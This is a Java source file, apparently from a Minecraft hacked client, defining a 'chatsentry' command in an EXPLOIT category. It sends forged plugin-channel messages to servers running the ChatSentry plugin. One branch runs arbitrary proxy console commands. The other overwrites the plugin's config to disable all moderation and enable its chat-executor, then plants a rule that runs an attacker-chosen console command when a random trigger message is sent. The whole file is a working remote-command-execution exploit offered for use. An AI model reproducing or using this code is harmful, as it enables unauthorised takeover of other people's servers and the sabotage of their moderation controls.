package net.paradise_client.command.impl;

import com.google.common.io.ByteArrayDataOutput;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.command.CommandSource;
import net.paradise_client.Helper;
import net.paradise_client.command.Command;
import net.paradise_client.command.CommandManager;

import java.util.Random;

public class ChatSentryCommand extends Command {
  private final String channel = "chatsentry:datasync";

  public ChatSentryCommand() {
    super("chatsentry", "Executes bungee command through console!", CommandManager.CommandCategory.EXPLOIT);
  }

  @Override public void build(LiteralArgumentBuilder<CommandSource> root) {
    root.executes(this::incompleteCommand)
      .then(literal("bungee").then(argument("command", StringArgumentType.greedyString()).executes(context -> {
        Helper.sendPluginMessage(channel, out -> {
          out.writeUTF("console_command");
          out.writeUTF(context.getArgument("command", String.class));
        });
        Helper.printChatMessage("Chat sentry bungee payload packet sent!");
        return SINGLE_SUCCESS;
      })))
      .then(literal("backend").executes(this::incompleteCommand)
        .then(argument("command", StringArgumentType.greedyString()).executes(context -> {
          String command = context.getArgument("command", String.class);
          new Thread(() -> sendAutoExecution(command)).start();
          return SINGLE_SUCCESS;
        })));

  }

  private void sendAutoExecution(String command) {
    String s = Helper.generateRandomString(4, "iahosd6as5d9oayhdstdou", new Random());
    Helper.sendPluginMessage(channel, out -> {
      buildConfig(out);
      out.writeUTF("2822111278697");
    });

    Helper.sendPluginMessage(channel, out -> {
      buildExecutor(out, command, s);
      out.writeUTF("2822111278697");
    });
    Helper.printChatMessage("Chat sentry backend payload packet sent! Sending execution message: " + s);
    try {
      Thread.sleep(100);
    } catch (InterruptedException e) {
      Helper.printChatMessage("Unable to sleep for message, send in chat: " + s);
    }
    getMinecraftClient().getNetworkHandler().sendChatMessage(s);
  }

  private void buildConfig(ByteArrayDataOutput out) {
    out.writeUTF("sync");
    out.writeUTF("");
    out.writeUTF("skibidi");
    out.writeUTF("config.yml");
    out.writeUTF("""
      check-for-updates: false
      process-chat: true
      process-commands: true
      process-signs: true
      process-anvils: true
      process-books: true
      context-prediction: true
      disable-vanilla-spam-kick: true
      network:
      enable: false
      sync-configs: true
      global-admin-notifier-messages: true
      enable-admin-notifier: false
      enable-discord-notifier: false
      enable-auto-punisher: false
      enable-word-and-phrase-filter: false
      enable-link-and-ad-blocker: false
      enable-spam-blocker: false
      enable-chat-cooldown: false
      enable-anti-chat-flood: false
      enable-unicode-remover: false
      enable-cap-limiter: false
      enable-anti-parrot: false
      enable-chat-executor: true
      enable-anti-statue-spambot: false
      enable-anti-relog-spam: false
      enable-anti-join-flood: false
      enable-anti-command-prefix: false
      enable-auto-grammar: false
      enable-command-spy: false
      enable-logging-for:
      chat-cooldown: false
      link-and-ad-blocker: true
      word-and-phrase-filter: true
      spam-blocker: true
      unicode-remover: true
      cap-limiter: true
      anti-parrot: true
      anti-chat-flood: true
      anti-statue-spambot: false
      chat-executor: false
      clean-logs-older-than: 30
      override-bypass-permissions:
      chat-cooldown: false
      link-and-ad-blocker: false
      word-and-phrase-filter: false
      spam-blocker: false
      unicode-remover: false
      cap-limiter: false
      anti-parrot: false
      anti-chat-flood: false
      anti-statue-spambot: false
      anti-join-flood: false
      chat-executor: true
      auto-grammar: false
      anti-command-prefix: false
      command-spy: false
      lockdown:
      active: false
      current-mode: "only-known"
      exempt-usernames:
        - "Notch"
        - "jeb_"
      command-blacklist:
      - "/tell"
      """);
  }

  private void buildExecutor(ByteArrayDataOutput out, String command, String executionMessage) {
    out.writeUTF("sync");
    out.writeUTF("modules");
    out.writeUTF("skibidi");
    out.writeUTF("chat-executor.yml");
    out.writeUTF("""
      entries:
        1:
          match: "{regex}(REPLACE-THE-MESSAGE)"
          set-matches-as: "{block}"
          execute:
            - "{console_cmd}: REPLACE-THE-COMMAND"
            - "{player_msg}: &a&lSUCCESS!"
      """.replaceAll("REPLACE-THE-COMMAND", command).replaceAll("REPLACE-THE-MESSAGE", executionMessage));
  }
}
